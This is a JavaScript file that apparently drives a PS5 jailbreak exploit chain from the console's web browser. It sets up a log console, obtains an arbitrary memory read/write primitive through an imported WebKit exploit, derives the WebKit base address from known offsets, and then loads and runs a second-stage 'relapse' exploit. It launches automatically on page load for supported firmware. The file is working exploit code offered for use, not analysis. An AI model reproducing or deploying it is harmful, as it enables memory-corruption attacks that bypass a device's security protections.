import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";

const output = document.getElementById("console-output");

if (!output) {
  throw new Error("Exploit console element not found");
}

function writeLog(message, type = "log", replace = false) {
  if (typeof window.addUiLog === "function" && !replace) {
    window.addUiLog(message, type === "log" ? "info" : type);
    return;
  }

  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }
  line.className = `log-line ${type === "log" ? "info" : type}`;
  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  while (output.childElementCount > 200) {
    output.firstElementChild.remove();
  }
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

let exploitPromise = null;
let exploitState = "idle";

async function getPrimitive() {
  writeLog("Starting WebKit exploit");
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog("ARW ready", "success");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

async function startExploit() {
  if (exploitState !== "idle") {
    throw new Error(
      exploitState === "running"
        ? "Exploit is already running"
        : "This exploit session cannot be restarted safely. Reload the page and try again.",
    );
  }

  exploitState = "running";
  window.dispatchEvent(new CustomEvent("exploit-state", {
    detail: { state: exploitState },
  }));

  exploitPromise = (async () => {
    const rejection = window.firmware.rejection();
    if (rejection)
      throw new Error(rejection);

    await window.offsetsReady;

    writeLog("Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
    writeLog(`Agent: ${navigator.userAgent}`, "info");
    writeLog(`Firmware: ${window.fw_str}`, "info");
    const primitive = await getPrimitive();
    writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

    await import("./relapse_exploit.js");
    await globalThis.main(primitive);
  })();

  try {
    await exploitPromise;
    exploitState = "completed";
    window.dispatchEvent(new CustomEvent("exploit-state", {
      detail: { state: exploitState },
    }));
  } catch (error) {
    exploitState = "failed";
    window.dispatchEvent(new CustomEvent("exploit-state", {
      detail: { state: exploitState },
    }));
    throw error;
  } finally {
    exploitPromise = null;
  }
}

window.startExploit = startExploit;

if (!window.firmware.rejection()) {
  window.startExploit().catch((error) => {
    writeLog(error instanceof Error ? error.message : String(error), "error");
  });
}